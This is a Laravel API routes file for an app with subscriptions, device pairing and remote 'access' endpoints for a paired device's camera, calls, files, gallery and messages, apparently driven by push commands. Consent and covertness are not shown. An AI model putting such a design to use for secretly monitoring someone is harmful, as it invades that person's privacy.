<?php

use Illuminate\Http\Request;
use Illuminate\Support\Facades\Route;
use App\Http\Controllers\AuthController;
use App\Http\Controllers\AccessController;
use App\Http\Controllers\DeviceController;
use App\Http\Controllers\Api\UserController;
use App\Http\Controllers\SubscriptionController;


Route::post('/register', [AuthController::class, 'register']);
Route::post('/login', [AuthController::class, 'login']);

Route::post('/email/verify', [AuthController::class, 'verifyEmail']);
Route::post('/email/resend', [AuthController::class, 'resendVerification']);

Route::middleware('auth:sanctum')->group(function () {

    Route::get('/user', [UserController::class, 'me']);

    Route::get('/plans', [SubscriptionController::class, 'plans']);
    Route::get('/payment-method', [SubscriptionController::class, 'paymentMethod']);
    Route::post('/subscribe', [SubscriptionController::class, 'subscribe']);

    Route::post('/devices/register', [DeviceController::class, 'register']);
    Route::post('/devices/pair', [DeviceController::class, 'pair']);
    Route::post('/devices/fcm', [DeviceController::class, 'updateFcmToken']);
    Route::get('/devices/check', [DeviceController::class, 'checkRegistered']);

    Route::post('/access/camera', [AccessController::class, 'camera']);
    Route::post('/access/call', [AccessController::class, 'call']);
    Route::post('/access/file', [AccessController::class, 'file']);
    Route::post('/access/gallery', [AccessController::class, 'gallery']);
    Route::post('/access/message', [AccessController::class, 'message']);

    Route::post('/command/complete', [AccessController::class, 'completeCommand']);
});
